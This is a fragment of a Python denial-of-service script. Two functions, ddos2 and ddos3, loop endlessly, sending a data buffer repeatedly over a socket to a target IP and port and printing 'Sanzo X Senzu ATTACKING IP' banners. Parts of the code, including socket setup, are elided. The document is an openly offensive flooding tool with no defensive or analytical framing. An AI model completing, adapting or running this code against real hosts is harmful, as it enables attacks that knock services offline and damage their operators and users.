...
def ddos2():
	...
	while True:
		try:
			...
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m Sanzo X Senzu ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] Sanzo X Senzu ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
...
def ddos3():
	...
	while True:
		try:
			...
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m Sanzo X Senzu ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] Sanzo X Senzu ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
